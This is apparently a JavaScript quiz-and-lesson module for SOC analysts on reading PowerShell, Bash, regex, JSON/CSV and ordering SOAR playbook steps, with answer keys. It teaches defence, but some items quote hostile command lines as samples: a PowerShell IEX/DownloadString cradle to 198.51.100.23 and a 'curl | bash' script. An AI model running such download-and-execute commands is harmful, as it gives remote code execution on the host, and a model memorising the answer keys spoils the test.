// Level 2 · Scripting, regex and SOAR: questions, lesson and misconceptions.
// Short scripts are shown as text to read, not to run. Encoded PowerShell examples are
// truncated so they are recognisable and not a working payload. ATT&CK IDs are Enterprise v19.

const S = 'l2-scripting';

const items = [
  {
    id: 'sc-01',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'In a SOC playbook, what is a **step** supposed to be?',
    choices: [
      'A named action with an owner, an input and a stop condition',
      'A paragraph of advice the analyst rewrites each time',
      'The vendor default severity copied onto the ticket',
      'A block of every IOC your feeds shipped this week',
    ],
    answer: 'A named action with an owner, an input and a stop condition',
    explanation:
      'A usable step says who does it, what they need in hand, and how they know it is finished. Essays and raw IOC dumps are not steps. SOAR can run the ones that are mechanical; the ones that need a judgement stay with a person.',
  },
  {
    id: 'sc-02',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'A phishing playbook lists these actions. Which order is safe?',
    choices: [
      'Wipe the laptop, then ask whether anyone clicked',
      'Email the sender and demand they stop',
      'Scope who received it, then contain the accounts that submitted credentials',
      'Close the ticket if SPF passed for the lookalike domain and tell the user it is fine',
    ],
    answer: 'Scope who received it, then contain the accounts that submitted credentials',
    misconceptions: { 'Wipe the laptop, then ask whether anyone clicked': 'script-wipe-first' },
    explanation:
      'Scope first (who got it, who clicked, who posted credentials), then contain those accounts: revoke sessions, reset the password, remove rules. Wiping destroys evidence and does not help the other mailboxes. Mailing the attacker warns them. SPF passing for their own domain is not innocence.',
  },
  {
    id: 'sc-03',
    skill: S,
    difficulty: 2,
    type: 'multi',
    bloom: 'analyze',
    prompt: 'Which of these PowerShell command lines are suspicious in a user context? Select all that apply.',
    snippet: `A  powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAo...
B  powershell.exe -NoProfile -File C:\\Windows\\CCM\\Inventory\\weekly.ps1
C  powershell.exe -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/a')"
D  powershell.exe Get-Service | Where-Object Status -eq Running`,
    choices: [
      'A: hidden window and a truncated -Enc blob',
      'B: a signed-path script launched by the management agent',
      'C: download a string and immediately invoke it',
      'D: list running services in an interactive console',
    ],
    answer: [
      'A: hidden window and a truncated -Enc blob',
      'C: download a string and immediately invoke it',
    ],
    misconceptions: { 'B: a signed-path script launched by the management agent': 'script-encoded-always-bad' },
    explanation:
      '**A** hides the window and passes a Base64 blob to `-EncodedCommand` (T1059.001, T1027). **C** is the classic download-and-execute cradle. **B** is a management script from a known path: check the parent (CCM) before you call it malware. **D** is an ordinary interactive query. Encoded is a smell, not a verdict.',
  },
  {
    id: 'sc-04',
    skill: S,
    difficulty: 1,
    type: 'text',
    bloom: 'remember',
    prompt: 'PowerShell\'s `-EncodedCommand` / `-Enc` blob is Base64 of which encoding? (e.g. UTF-8)',
    accept: ['utf-16le', 'utf-16-le', 'utf16le', 'unicode'],
    explanation:
      'Windows PowerShell decodes `-EncodedCommand` as **UTF-16LE** (what Windows calls Unicode), then runs the resulting text. That is why a blob often starts with something like `SQBFAFgA` for "IEX". Decoding it in the log pipeline (Event 4104 already stores the clear script block) is how you read it without running it.',
  },
  {
    id: 'sc-05',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'What does this one-line Python actually count?',
    snippet: `hits = [e for e in events if e.get("event_id") == "4625"]
print(len(hits))`,
    choices: [
      'Failed logons whose id is the number 4625',
      'Rows whose event_id is the string "4625"',
      'Every event, because get never returns None',
      'Successful logons, because 4625 means success',
    ],
    answer: 'Rows whose event_id is the string "4625"',
    explanation:
      '`== "4625"` compares to a **string**. If the parser stored the id as an integer, the list stays empty and you report "no failures" when the data was numeric. 4625 is a failed logon, not a success (that is 4624). `get` returns None when the key is missing, and None is not equal to "4625".',
  },
  {
    id: 'sc-06',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'This Bash snippet is about to delete more than the author meant. Why?',
    snippet: `dir=$1
rm -rf $dir/cache`,
    choices: [
      'The quotes around $dir make the shell skip the check',
      'If dir is empty, it becomes rm -rf /cache',
      'rm -rf refuses to run unless the path is absolute',
      'cache is a bash builtin, so the line never deletes',
    ],
    answer: 'If dir is empty, it becomes rm -rf /cache',
    misconceptions: { 'The quotes around $dir make the shell skip the check': 'script-unquoted' },
    explanation:
      '`$dir` is **unquoted**. An empty value disappears, leaving `rm -rf /cache`. Worse shapes (`rm -rf $dir/` with a trailing slash and an empty variable) have become `rm -rf /`. Quote it (`"$dir/cache"`), refuse an empty value, and never point rm at a path you built from a log line you did not check.',
  },
  {
    id: 'sc-07',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'understand',
    prompt: 'In a regex, what does a bare `.` match?',
    choices: [
      'Only a literal dot, as in an IP address',
      'Any one character except a newline',
      'The start of the line, like ^',
      'One or more digits',
    ],
    answer: 'Any one character except a newline',
    misconceptions: { 'Only a literal dot, as in an IP address': 'script-regex-dot' },
    explanation:
      '`.` is **any character** (except newline, in the usual modes). A literal dot is `\\.`. That is why `10.1.1.1` as a pattern also matches `10a1b1c1`. Anchors are `^` and `$`. Digits are `\\d` or `[0-9]`.',
  },
  {
    id: 'sc-08',
    skill: S,
    difficulty: 2,
    type: 'text',
    bloom: 'apply',
    prompt: 'Which metacharacter do you escape so a regex matches a literal dot in an IP? (the escape, e.g. \\\\d)',
    accept: ['\\.', '\\\\.', '\\.'],
    explanation:
      'You want `\\.`. In a regex the backslash makes the dot literal. In a language string you often write the backslash twice so the regex engine still sees one. The pattern `\\d{1,3}(?:\\.\\d{1,3}){3}` is the usual "looks like an IPv4" check, and it still needs a range check because 999.1.1.1 matches it.',
  },
  {
    id: 'sc-09',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'You want the user field from this proxy line. Which pattern\'s first group is the user?',
    snippet: `09:14:02 WS-FIN-09 emma GET https://news.example.org/markets 200`,
    choices: [
      '^(\\d\\d:\\d\\d:\\d\\d) captures the user',
      '\\d{3}$ captures the user at the end',
      'GET\\s+(\\S+) captures the user before GET',
      '^\\S+\\s+\\S+\\s+(\\S+) captures the third field',
    ],
    answer: '^\\S+\\s+\\S+\\s+(\\S+) captures the third field',
    explanation:
      'The fields are time, host, user, method, URL, status. `^\\S+\\s+\\S+\\s+(\\S+)` skips two tokens and captures the third, `emma`. The time pattern captures the clock. `\\d{3}$` captures the status. `GET\\s+(\\S+)` captures the URL.',
  },
  {
    id: 'sc-10',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'understand',
    prompt: 'Why is this text not valid JSON?',
    snippet: `{
  "user": "emma",
  "src": "198.51.100.61",
}`,
    choices: [
      'JSON objects cannot contain IP addresses',
      'A trailing comma after the last field is illegal',
      'Keys must be single-quoted, not double-quoted, like Python',
      'Two fields are too few for an object',
    ],
    answer: 'A trailing comma after the last field is illegal',
    misconceptions: { 'Keys must be single-quoted, not double-quoted, like Python': 'script-json-csv' },
    explanation:
      'JSON forbids **trailing commas**. Keys and strings use double quotes. IPs are just strings. The fix is to delete the comma after the last value. CSV is a different format and would not use braces at all.',
  },
  {
    id: 'sc-11',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'A parser split this CSV on every comma. What broke?',
    snippet: `host,user,note
WS-1,emma,"clicked, then reported"
WS-2,jonas,no click`,
    choices: [
      'The header is shorter than the data rows',
      'The quoted comma was treated as a separator',
      'CSV cannot store spaces inside a field',
      'The second row is missing a user',
    ],
    answer: 'The quoted comma was treated as a separator',
    explanation:
      'A real CSV parser keeps commas **inside quotes** as part of the field. A naive `split(",")` turns "clicked, then reported" into two columns and shifts the rest. That is how a note becomes a hostname in the next dashboard. Use a CSV library, not split.',
  },
  {
    id: 'sc-12',
    skill: S,
    difficulty: 1,
    type: 'text',
    bloom: 'remember',
    prompt: 'In JSON, which value is the boolean true? (the literal, lower case)',
    accept: ['true'],
    misconceptions: { yes: 'script-json-csv', '"true"': 'script-json-csv', '1': 'script-json-csv' },
    explanation:
      'The JSON boolean is `true` (also `false` and `null`), unquoted. `"true"` is a string. `1` is a number. A playbook that checks `field == "true"` will miss a real boolean and skip the containment step.',
  },
  {
    id: 'sc-13',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'What is wrong with this containment step in a SOAR playbook?',
    snippet: `when: alert.severity == "high"
action: isolate_host
input: alert.src_ip
# no check that src_ip is internal`,
    choices: [
      'High severity is not a reason to automate anything',
      'It may isolate an external attacker address, or a shared NAT',
      'isolate_host can only be done by editing the registry by hand',
      'Playbooks are not allowed to read src_ip',
    ],
    answer: 'It may isolate an external attacker address, or a shared NAT',
    misconceptions: { 'High severity is not a reason to automate anything': 'script-wipe-first' },
    explanation:
      'Automating isolation is fine **after a guard**. `src_ip` on a brute-force alert is often the attacker on the internet, or a NAT that hides fifty staff. Isolating it does nothing useful or takes out a floor. Require an asset lookup: internal, single host, not a jump box, then isolate.',
  },
  {
    id: 'sc-14',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'Which guard belongs in front of an automated "disable the user" action?',
    choices: [
      'Disable every account mentioned in any alert',
      'Skip the action if the account is a break-glass admin',
      'Only run it when the alert text contains the word malware',
      'Disable the account and the user\'s manager together',
    ],
    answer: 'Skip the action if the account is a break-glass admin',
    explanation:
      'Automation needs **exclusions**: break-glass and service accounts, a maximum number of disables per hour, and a human approval above that. Disabling everyone mentioned in an alert is how one noisy rule locks out the SOC. The word "malware" is not a safety check.',
  },
  {
    id: 'sc-15',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'understand',
    prompt: 'Event ID **4104** is useful against encoded PowerShell because it records…',
    choices: [
      'Only the Base64, so you still have to run it',
      'The script block after PowerShell decoded it',
      'The network packets the script sent',
      'A hash of the console, with the text removed',
    ],
    answer: 'The script block after PowerShell decoded it',
    explanation:
      'Script block logging (4104) stores the **decoded** script text, including what `-EncodedCommand` expanded to, often in several chunks you reassemble. You read that text. You do not execute the blob to see what it was. Network activity is a different log.',
  },
  {
    id: 'sc-16',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'Parent process is `CcmExec.exe`, script is an inventory export to a CCM path. What is the proportionate response?',
    snippet: `Parent: C:\\Windows\\CCM\\CcmExec.exe
Cmd: powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQB...
4104: Get-CimInstance Win32_Product | Export-Csv C:\\Windows\\CCM\\Inventory\\apps.csv`,
    choices: [
      'Isolate the host: encoded PowerShell is always an attack',
      'Treat it as the management agent, and confirm the deployment',
      'Delete CcmExec.exe so the technique cannot return',
      'Block all of powershell.exe on the estate today',
    ],
    answer: 'Treat it as the management agent, and confirm the deployment',
    misconceptions: { 'Isolate the host: encoded PowerShell is always an attack': 'script-encoded-always-bad' },
    explanation:
      'Context beats the flag. A known management parent, a decoded script that only inventories, and a write under CCM is a **benign** admin pattern. Confirm the deployment id. Isolating every encoded command will isolate patch Tuesday. Blocking powershell.exe breaks administration. Hunt the same flag when the parent is Office or a user temp path.',
  },
  {
    id: 'sc-17',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'What does `^` mean in a regular expression?',
    choices: [
      'One or more of the previous token',
      'The beginning of the line (or of the text)',
      'A literal caret that must be escaped to work',
      'Either of the two surrounding groups',
    ],
    answer: 'The beginning of the line (or of the text)',
    explanation:
      '`^` anchors to the **start**. `$` anchors to the end. `+` is one or more. `|` is alternation. A literal caret inside a character class is different (`[^0-9]` means "not a digit"); outside, it is the anchor.',
  },
  {
    id: 'sc-18',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'Which pattern finds a failed logon id without also matching 14625?',
    choices: [
      '4625, anywhere in the line',
      '\\b4625\\b so it is not part of a longer number',
      '4625$ only when the line ends with it',
      '^4625 only when the whole line starts with that id',
    ],
    answer: '\\b4625\\b so it is not part of a longer number',
    explanation:
      'A bare `4625` matches inside `14625` and `46250`. Word boundaries (`\\b`) keep it a whole token, which is what you want in a message that also contains other numbers. `^` and `$` only help when the id is the entire line.',
  },
  {
    id: 'sc-19',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'Why does this Python "top talkers" report lie?',
    snippet: `from collections import Counter
c = Counter()
for row in open("proxy.csv"):
    parts = row.split(",")
    c[parts[2]] += 1
print(c.most_common(5))`,
    choices: [
      'Counter cannot count strings, only integers',
      'It counts the header, and it splits commas inside quotes',
      'most_common always returns the smallest five',
      'open() refuses a CSV, so the loop never runs',
    ],
    answer: 'It counts the header, and it splits commas inside quotes',
    explanation:
      'The first row is the header, so "user" becomes a talker. `split(",")` also breaks quoted commas, so notes turn into fake users. Skip the header (or use `csv.DictReader`) and you are counting the field you think you are counting.',
  },
  {
    id: 'sc-20',
    skill: S,
    difficulty: 2,
    type: 'multi',
    bloom: 'apply',
    prompt: 'A SOAR playbook may do which of these without a person in the loop? Select all that apply.',
    choices: [
      'Open a ticket and attach the alert fields',
      'Enrich the source IP from the lookup panel',
      'Wipe a file server because one alert fired',
      'Add a tag and the matched rule name',
      'Disable every VPN account in the company',
    ],
    answer: [
      'Open a ticket and attach the alert fields',
      'Enrich the source IP from the lookup panel',
      'Add a tag and the matched rule name',
    ],
    misconceptions: { 'Wipe a file server because one alert fired': 'script-wipe-first' },
    explanation:
      'Enrichment, tagging and ticketing are reversible and local. Wiping a server or disabling every VPN account is **containment of the whole business** and needs a person, a rate limit and an exclusion list. Automate the lookup; gate the blast radius.',
  },
  {
    id: 'sc-21',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'understand',
    prompt: 'What is the difference between `cmd1 && cmd2` and `cmd1; cmd2` in Bash?',
    choices: [
      'They are identical; both always run cmd2',
      '&& runs cmd2 only when cmd1 returned success',
      '; runs cmd2 only when cmd1 was a pipeline',
      '&& runs both commands in the background',
    ],
    answer: '&& runs cmd2 only when cmd1 returned success',
    explanation:
      '`&&` is conditional on a **zero exit code**. `;` runs the next command no matter what. A playbook that uses `;` after a failed lookup will still push a block built from empty data. Check the exit code, or use `&&`.',
  },
  {
    id: 'sc-22',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'Where should this step sit in an account-takeover playbook?',
    snippet: `Step: reset the password and revoke refresh tokens
Evidence so far: sign-in from a new hosting IP, inbox rule created, user has not been contacted`,
    choices: [
      'Last, after a week of watching whether the rule fires again',
      'Before you revoke sessions, email the user from the same mailbox',
      'Now: revoke and reset, then confirm with the user out of band',
      'Never: a hosting IP is always the corporate VPN',
    ],
    answer: 'Now: revoke and reset, then confirm with the user out of band',
    explanation:
      'The attacker is in the mailbox. Waiting a week lets them read mail. Emailing that mailbox reaches the attacker. Revoke sessions and reset the password **now**, then phone the user on a known number. A hosting IP is not your VPN; check the asset list if you are unsure, but do not leave the session up while you debate.',
  },
  {
    id: 'sc-23',
    skill: S,
    difficulty: 2,
    type: 'text',
    bloom: 'apply',
    prompt: 'A JSON playbook field `isolate` is the boolean false. A string check looks for "false". Does the string check match? (yes or no)',
    accept: ['no', 'no.'],
    explanation:
      '**No.** The boolean `false` is not the string `"false"`. This is a common SOAR bug: the guard looks true in the editor and never fires in production, or the opposite. Compare booleans to booleans.',
  },
  {
    id: 'sc-24',
    skill: S,
    difficulty: 1,
    type: 'mc',
    bloom: 'remember',
    prompt: 'Which PowerShell flag hides the console window?',
    choices: [
      '-ExecutionPolicy Bypass, which only changes policy',
      '-WindowStyle Hidden, often written -W Hidden',
      '-NoProfile, which only skips the profile',
      '-EncodedCommand, which only changes the encoding',
    ],
    answer: '-WindowStyle Hidden, often written -W Hidden',
    explanation:
      '`-WindowStyle Hidden` (short `-W Hidden`) is the "do not show a window" flag and is common in malicious one-liners. `-NoProfile` / `-NoP` skips the profile. `-ExecutionPolicy Bypass` ignores the policy for that process. `-EncodedCommand` carries the script. Attackers stack them; each one means a different thing.',
  },
  {
    id: 'sc-25',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'This regex is meant to catch only internal web requests. What does it also catch?',
    snippet: `^10\\.\\d+\\.\\d+\\.\\d+\\s+GET`,
    choices: [
      'Nothing: the dots are escaped, so the pattern is already exact',
      '10.999.1.1 GET, because \\d+ allows more than three digits',
      'Every line, because ^ matches in the middle',
      'Only POST requests, because GET is optional',
    ],
    answer: '10.999.1.1 GET, because \\d+ allows more than three digits',
    misconceptions: { 'Nothing: the dots are escaped, so the pattern is already exact': 'script-regex-dot' },
    explanation:
      'The dots are escaped, good. `\\d+` is **one or more** digits, so `10.9999.1.1` and `10.1.2.3456` match and are not real interface addresses. Prefer `\\d{1,3}` and then check the octets are 0–255. `^` really is the start, and GET is required.',
  },
  {
    id: 'sc-26',
    skill: S,
    difficulty: 2,
    type: 'multi',
    bloom: 'understand',
    prompt: 'Which are reasons to keep a step manual instead of in SOAR? Select all that apply.',
    choices: [
      'It can lock out a large group if the input is wrong',
      'The decision needs a phone call the tool cannot make',
      'It only copies fields onto a ticket',
      'It deletes data you cannot get back',
      'It looks up a hash in a local table',
    ],
    answer: [
      'It can lock out a large group if the input is wrong',
      'The decision needs a phone call the tool cannot make',
      'It deletes data you cannot get back',
    ],
    explanation:
      'High blast radius, irreversible destruction and a human conversation stay manual (or behind an approval). Copying fields and a local hash lookup are what automation is for. "We could script it" is not the same as "we should let it run at 03:00".',
  },
  {
    id: 'sc-27',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'A playbook resets the password but does not revoke sessions. What can the attacker still do?',
    choices: [
      'Nothing: a password change kills every token',
      'Keep using a refresh token or cookie until it expires',
      'Only read files on the laptop, not the cloud',
      'Sign in, but MFA will always block the old session',
    ],
    answer: 'Keep using a refresh token or cookie until it expires',
    explanation:
      'A password reset does **not** reliably kill existing refresh tokens or session cookies. Entra ID needs an explicit session revoke (`revokeSignInSessions`); even then, access tokens live until they expire unless continuous access evaluation cuts them. Put revoke in the same step as the reset.',
  },
  {
    id: 'sc-28',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'analyze',
    prompt: 'Read the Bash. What will `tool.sh` do with this argument?',
    snippet: `#!/bin/bash
# tool.sh
curl -fsSL "$1" | bash
# called as: ./tool.sh http://198.51.100.23/setup.sh`,
    choices: [
      'Download the URL and print it, without running it',
      'Download the URL and execute whatever it contains',
      'Refuse, because curl cannot write to a pipe',
      'Run setup.sh from the local disk only',
    ],
    answer: 'Download the URL and execute whatever it contains',
    misconceptions: { 'Refuse, because curl cannot write to a pipe': 'script-unquoted' },
    explanation:
      '`curl ... | bash` **downloads and runs** the body. Quoting `$1` stops word-splitting; it does not make the pipeline safe. Treat "pipe a URL to a shell" as remote code execution (T1059.004). The safe pattern is download, hash, and run a pinned file.',
  },
  {
    id: 'sc-29',
    skill: S,
    difficulty: 1,
    type: 'text',
    bloom: 'remember',
    prompt: 'In regex, which quantifier means "one or more" of the previous token? (one character)',
    accept: ['+'],
    explanation:
      '`+` is one or more. `*` is zero or more. `?` is zero or one. `{3}` is exactly three. These apply to the previous token, so `\\d+` is one or more digits and `.+` is one or more of anything.',
  },
  {
    id: 'sc-30',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'apply',
    prompt: 'You are writing a detection for the download cradle, not for one URL. Which pattern survives the next host?',
    choices: [
      'The literal IP 198.51.100.23',
      'IEX and DownloadString in the same script block',
      'The file name setup.sh from this one campaign only',
      'A hash of the 4104 event record',
    ],
    answer: 'IEX and DownloadString in the same script block',
    explanation:
      'The **behaviour** (download a string and invoke it) is the TTP, T1059.001. The IP and the file name change tomorrow. A hash of the log event will never repeat. Put the behaviour in the detection and the IP in the ticket for this case.',
  },
  {
    id: 'sc-31',
    skill: S,
    difficulty: 3,
    type: 'mc',
    bloom: 'evaluate',
    prompt: 'A playbook step failed halfway: the password was reset, the revoke call returned 403. What do you do?',
    choices: [
      'Mark the step successful so the playbook dashboard stays green',
      'Stop, record the 403, and revoke by hand before you move on',
      'Run the wipe step, which does not need the API',
      'Retry the whole playbook from the start in a loop',
    ],
    answer: 'Stop, record the 403, and revoke by hand before you move on',
    misconceptions: { 'Mark the step successful so the playbook dashboard stays green': 'script-wipe-first' },
    explanation:
      'A failed revoke means the attacker may still hold a session. Do not paint the step green, and do not jump to a destructive step to "finish". Fix the revoke (permissions, the right API), confirm sessions are gone, then continue. Looping the whole playbook can reset the password again and spam the user.',
  },
  {
    id: 'sc-32',
    skill: S,
    difficulty: 2,
    type: 'mc',
    bloom: 'understand',
    prompt: 'Which quote style does JSON require around keys and strings?',
    choices: [
      'Single quotes, as in Python dict literals',
      'Double quotes, and no trailing comma',
      'Backticks, so a playbook can embed newlines',
      'No quotes, if the key is a single word',
    ],
    answer: 'Double quotes, and no trailing comma',
    explanation:
      'JSON strings and keys use **double quotes**. Single quotes and bare words are legal in Python and in JavaScript object literals, and illegal in JSON. A playbook file that "works" in the editor and fails in the runner is often this, plus a trailing comma.',
  },
];

const lesson = {
  skill: S,
  title: 'Scripting, regex and playbooks',
  goal: 'Read a short script safely, pull a field out of a log with a regex, and order playbook steps so automation cannot outrun the evidence.',
  sections: [
    {
      id: 'shells',
      heading: 'Reading PowerShell, Python and Bash',
      body: [
        'You are not asked to write malware. You are asked to **read** a few lines and say what they do. PowerShell: `-NoP` skips the profile, `-W Hidden` hides the window, `-Enc` is UTF-16LE Base64 of the real script, `IEX` (Invoke-Expression) runs a string, `DownloadString` fetches one. Event **4104** stores the script block after decoding, so you read the log instead of running the blob.',
        'Python list comprehensions and `==` show you what a report counted, including the bug where a string is compared to a number. Bash `&&` stops when the previous command failed; `;` does not. Unquoted `$dir` disappears when it is empty. `curl url | bash` downloads and executes. Quote variables, refuse empty paths, and never pipe a URL into a shell.',
      ],
      evidence: {
        label: 'Same flag, two parents (text only, truncated)',
        text: 'Suspicious:  winword.exe > powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAo...\nBenign:     CcmExec.exe > powershell.exe -Enc SQB...   4104: Get-CimInstance ... Export-Csv C:\\Windows\\CCM\\Inventory\\apps.csv',
      },
    },
    {
      id: 'regex',
      heading: 'Regex for log lines',
      body: [
        'A pattern is a contract with the log. `.` is any character; a dot in an IP is `\\.`. `\\d` is a digit, `+` is one or more, `{1,3}` is one to three. `^` and `$` are the ends of the line. `\\b` is a word boundary so `4625` does not match inside `14625`. Parentheses capture the piece you want.',
        'Test the pattern on a line that should match **and** one that should not. `\\d+` will happily match `99999`. A split on commas is not a CSV parser once someone puts a comma inside quotes.',
      ],
    },
    {
      id: 'data',
      heading: 'JSON and CSV',
      body: [
        'JSON: double quotes, no trailing comma, `true`/`false`/`null` unquoted. A boolean `false` is not the string `"false"`, and that single mix-up silently skips a SOAR guard. CSV: commas inside quotes belong to the field. Use a parser. Counting `split(",")[2]` will promote the header row and any quoted comma into a fake user.',
      ],
    },
    {
      id: 'playbooks',
      heading: 'Ordering steps, and what automation may do',
      body: [
        'Order follows the incident, not the tool. **Scope** (who received it, which accounts submitted credentials), then **contain** (revoke sessions and reset the password together; a reset alone leaves refresh tokens alive), then eradicate, then recover. Do not wipe a host to answer a question the logs already answer. Do not email a mailbox the attacker is reading.',
        'SOAR is for the reversible and the local: open the ticket, attach the fields, enrich the IP, tag the rule. Isolation and disables need a guard (internal asset, not break-glass, not a shared NAT, under a rate limit). If a step returns 403, the step failed. Do not mark it green and continue.',
      ],
      points: [
        'Encoded PowerShell is a lead. The parent process and the decoded 4104 text decide benign or malicious.',
        'A playbook that can lock out the company is a manual step with an approval, not a 03:00 action.',
      ],
    },
  ],
  worked: [
    {
      id: 'sc-w1',
      title: 'Two encoded PowerShell commands',
      artifactLabel: 'Process and 4104 (truncated, do not run)',
      artifact:
        '1) Parent winword.exe\n   powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAo...\n   4104: IEX (New-Object Net.WebClient).DownloadString(\'http://198.51.100.23/a\')\n2) Parent C:\\Windows\\CCM\\CcmExec.exe\n   powershell.exe -Enc SQB...\n   4104: Get-CimInstance Win32_Product | Export-Csv C:\\Windows\\CCM\\Inventory\\apps.csv',
      question: 'Which one is an intrusion, and what do you automate?',
      steps: [
        'Decode from 4104. Do not execute either blob. The first script downloads a string and invokes it. The second only exports inventory.',
        'Check the parent. Word launching a hidden encoded command is user execution. CcmExec launching inventory is the management agent.',
        'Contain the first host: isolate if policy says so, block 198.51.100.23, and hunt the DownloadString pattern rather than this one IP.',
        'For the second, confirm the deployment. Automate the ticket and the enrichment. Do not automate "isolate on any -Enc".',
      ],
      conclusion: 'The Word cradle is the intrusion (T1059.001). The CCM inventory is benign. The detection you keep is the behaviour; the IP goes on this ticket.',
    },
  ],
  faded: [
    {
      id: 'sc-f1',
      title: 'A disable-user action',
      artifactLabel: 'SOAR step (draft)',
      artifact:
        'when: alert contains "impossible travel"\naction: disable_user(alert.user)\nexclusions: none\non_error: continue',
      question: 'What has to change before this may run unattended?',
      given: [
        'Impossible-travel alerts include VPN exits and mobile networks, so the user field is sometimes a false positive.',
        'on_error: continue will proceed even if the directory refuses the call.',
      ],
      todo: [
        {
          prompt: 'Which change is required?',
          type: 'mc',
          choices: [
            'Add exclusions, a rate limit, and stop when the API fails',
            'Disable the user\'s manager as well, so someone notices',
            'Nothing: travel alerts are always true positives',
          ],
          answer: 'Add exclusions, a rate limit, and stop when the API fails',
          explanation: 'Break-glass accounts stay out, you cap how many disables an hour, and a failed call stops the playbook instead of pretending it worked.',
        },
        {
          prompt: 'The API returns 403 on revoke after a successful password reset. The step status should be…',
          type: 'mc',
          choices: [
            'Failed, until a person confirms the sessions are gone',
            'Success, because the password changed',
            'Skipped, so the metric stays green',
          ],
          answer: 'Failed, until a person confirms the sessions are gone',
          explanation: 'A reset without a revoke leaves the attacker\'s refresh token alive. The step is not done.',
        },
      ],
    },
  ],
};

const misconceptions = [
  {
    id: 'script-encoded-always-bad',
    skill: S,
    name: 'Encoded PowerShell is always an attack',
    description: 'Isolates every -EncodedCommand and ignores the parent process and the decoded script.',
    fix: 'EncodedCommand hides the text from a casual reader; administrators and management agents use it too. Read 4104 (the decoded script block) and the parent. A hidden window plus a download cradle from Office is hostile. An inventory export from CcmExec is not.',
    lesson: `${S}#shells`,
  },
  {
    id: 'script-regex-dot',
    skill: S,
    name: 'A dot in a regex is a dot',
    description: 'Writes 10.1.1.1 as a pattern and matches 10a1b1c1, or trusts \\\\d+ to mean an octet.',
    fix: '`.` matches any character; a literal dot is `\\.`. `\\\\d+` is one or more digits, not "one to three". Use `\\\\d{1,3}` and still check the value is 0–255. Anchor with `\\\\b` so 4625 does not match inside 14625.',
    lesson: `${S}#regex`,
  },
  {
    id: 'script-unquoted',
    skill: S,
    name: 'Unquoted variables are fine',
    description: 'Builds rm or curl commands with unquoted shell variables taken from alerts.',
    fix: 'An empty unquoted `$dir` disappears, so `rm -rf $dir/cache` can become `rm -rf /cache`. Quote `"$dir"`, refuse empty input, and never pipe `curl` of an alert URL into bash. That pipeline executes whatever the server sends.',
    lesson: `${S}#shells`,
  },
  {
    id: 'script-json-csv',
    skill: S,
    name: 'JSON and CSV are whatever the editor accepts',
    description: 'Allows trailing commas, single quotes, and split-on-comma, and compares a boolean to a string.',
    fix: 'JSON is double quotes, no trailing comma, and true/false/null are not strings. `"false"` does not equal `false`, so a SOAR guard written that way never fires. CSV fields may contain commas inside quotes; use a parser, not `split(",")`, or your counts shift by one.',
    lesson: `${S}#data`,
  },
  {
    id: 'script-wipe-first',
    skill: S,
    name: 'Wipe first, ask later',
    description: 'Orders playbooks so destruction or a mass disable happens before scoping, and treats a failed API call as success.',
    fix: 'Scope, then contain the accounts that are actually affected: revoke sessions and reset the password together. Wiping a host does not answer who else received the mail. Automation may enrich and ticket freely; isolation and disables need exclusions, a rate limit, and a hard stop when the call fails.',
    lesson: `${S}#playbooks`,
  },
];

export const SCRIPTING = { items, lesson, misconceptions };
